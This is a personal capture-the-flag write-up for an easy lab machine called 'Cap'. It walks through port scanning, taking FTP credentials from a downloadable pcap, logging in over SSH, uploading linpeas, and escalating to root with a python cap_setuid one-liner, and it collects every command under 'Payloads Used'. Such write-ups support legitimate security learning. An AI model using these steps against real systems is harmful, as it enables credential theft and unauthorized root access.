## 🐚 CAP
**Level**: easy  
**Date**: August 5, 2025  
**Goal**: get the user flag and root flag 

---

### 🧰 Tools  
- `nmap`  
- `ftp`  
- `ssh`  
- `wireshark`  
- `linpeas.sh`  
- Linux post-exploitation enumeration techniques  
---

### 🧭 Steps  

1. 🔎 **Scan the machine** for open services:
   ```bash
   nmap -sC -sV -n -F -T4 10.129.X.X
   ```
   found the open port of SSH and FTP 

---

2. 🌐 **Access the website** at `http://10.129.X.X`  
   A cost tracking panel was displayed.

---

3. 📁 **Explore web paths**:
   - Visited `/data/5`: different view  
   - Visited `/data/0`: download page for a `.pcap` file

---

4. 🧪 **Analyze `0.pcap` in Wireshark**:
   - Discovered FTP protocol traffic  
   - Found credentials for user `nathan`

---

5. 🔐 **Login via FTP**:
   ```bash
   ftp 10.129.X.X  
   # Username: nathan  
   # Password: [from .pcap file]
   ```

---

6. 📜 **Enumerate FTP directory**:
   ```bash
   ls -al  
   cat user.txt  
   # Retrieved user flag
   ```

---

7. 📡 **Switch to SSH**:
   ```bash
   ssh nathan@10.129.X.X  
   ```

---

8. 👤 **Check user groups and privileges**:
   ```bash
   id
   ```

---

9. 📦 **Download and upload `linpeas.sh` for enumeration**:
   On local machine:
   ```bash
   scp linpeas.sh nathan@10.129.X.X:/home/nathan/
   ```

   On target machine:
   ```bash
   chmod +x linpeas.sh  
   ./linpeas.sh
   ```

---

10. ⚙️ **Discover Linux Capabilities**:
   ```bash
   find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
   ```

---

### Output
```bash
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

---

11. 🚀 **Exploit capability to escalate to root**:
   ```bash
   /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

---

12. 🏁 **Become root and retrieve the root flag**:
   ```bash
   cd /  
   cd root  
   ls  
   cat root.txt
   ```

---

### 💬 Notes  
- This was the **first full machine** you solved! 🎉  
- i learned to extract FTP credentials from `.pcap` files  
- i practiced uploading and executing post-exploitation tools  
- i discovered **Linux capabilities** for privilege escalation  
---

### 💣 Payloads Used  
```bash
nmap -F 10.129.X.X  
ftp 10.129.X.X  
ssh nathan@10.129.X.X  
scp linpeas.sh nathan@10.129.X.X:/home/nathan/  
chmod +x linpeas.sh  
./linpeas.sh  
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;  
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'  
cat user.txt  
cat root.txt
```
